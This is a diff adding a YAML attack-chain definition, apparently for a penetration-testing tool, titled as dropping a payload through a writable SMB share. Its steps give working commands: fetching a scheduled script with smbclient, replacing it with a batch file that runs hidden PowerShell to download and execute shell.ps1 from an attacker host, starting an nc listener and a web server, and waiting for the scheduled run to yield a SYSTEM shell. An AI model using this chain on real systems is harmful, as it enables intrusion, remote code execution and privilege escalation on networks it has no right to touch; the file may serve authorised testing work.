@@ -1,0 +1,42 @@
+chain_id: smb_share_payload_drop
+title: "SMB writable share — drop a payload that runs as SYSTEM"
+severity: CRITICAL
+tags: [smb, shares, write, reverse-shell, scheduled-task]
+
+trigger:
+  any_of:
+    - { kind: "smb-share-write" }
+
+description: |
+  A writable SMB share was found. If it hosts scripts launched by scheduled
+  tasks or service accounts (.bat, .ps1, .sh), replace one with a reverse
+  shell — next execution lands as SYSTEM (or the service identity).
+
+steps:
+  - id: 1
+    title: "Download the existing script to understand it"
+    command: smbclient //$VICTIMA/SHARE -N -c 'cd path; get script.bat'
+
+  - id: 2
+    title: "Build a malicious replacement"
+    command: |
+      cat > exploit.bat << 'EOF'
+      @echo off
+      powershell -NoP -NonI -W Hidden -Exec Bypass -Command "iex(New-Object Net.WebClient).DownloadString('http://10.0.2.15:8000/shell.ps1')"
+      EOF
+
+  - id: 3
+    title: "Three terminals: listener / web server / upload"
+    command: |
+      nc -lvnp 4444
+      python3 -m http.server 8000
+      smbclient //$VICTIMA/SHARE -N -c 'cd path; put exploit.bat script.bat'
+
+  - id: 4
+    title: "Wait for the next scheduled run — shell drops as SYSTEM"
+    notes: |
+      If you don't know the schedule, drop a separate watcher with pspy
+      (Linux) or use Process Monitor (Windows) to confirm execution interval.
+
+references:
+  - https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb
